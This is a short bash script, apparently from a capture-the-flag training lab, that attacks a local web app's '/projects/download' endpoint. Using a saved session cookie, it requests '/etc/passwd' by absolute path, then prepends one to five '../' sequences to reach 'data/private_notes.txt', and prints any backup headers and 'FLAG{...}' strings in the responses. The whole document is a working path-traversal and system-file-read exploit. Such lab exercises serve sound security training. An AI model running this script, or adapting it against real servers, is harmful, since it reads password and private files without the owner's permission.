
#!/usr/bin/env bash
set -euo pipefail

BASE_URL="http://localhost:4942"
COOKIE_JAR="../02_weak_password_change_or_reset_functionalities/cookies.txt"
ENDPOINT="/projects/download"
PARAM="file"

NORMAL_FILE="faq_darkly.pdf"
TARGET_FILE="data/private_notes.txt"

MAX_DEPTH=5

request_file() {
    local filename="$1"
    local label="$2"

    local headers
    local body

    headers=$(mktemp)
    body=$(mktemp)

    local status
    status=$(curl -sS \
        --get \
        -b "$COOKIE_JAR" \
        --data-urlencode "${PARAM}=${filename}" \
        -D "$headers" \
        -o "$body" \
        -w "%{http_code}" \
        "${BASE_URL}${ENDPOINT}")

    echo
    echo "[$label]"
    echo "File: $filename"
    echo "HTTP Status: $status"

    if grep -qi '^x-backup-' "$headers"; then
        echo "Backup-related headers:"
        grep -i '^x-backup-' "$headers"
    fi

    if grep -q 'FLAG{' "$body"; then
        echo "[FOUND] Flag detected:"
        grep -oE 'FLAG\{[^}]+\}' "$body"
    fi

    rm -f "$headers" "$body"
}

echo
echo "[1] Normal document request"
request_file "$NORMAL_FILE" "NORMAL"

echo
echo "[2] Absolute path test"
request_file "/etc/passwd" "ABSOLUTE PATH"

echo
echo "[3] Path traversal test"

for depth in $(seq 1 "$MAX_DEPTH"); do
    traversal=""

    for ((i=0; i<depth; i++)); do
        traversal+="../"
    done

    request_file "${traversal}${TARGET_FILE}" "DEPTH $depth"
done

echo
echo "[4] Test completed"
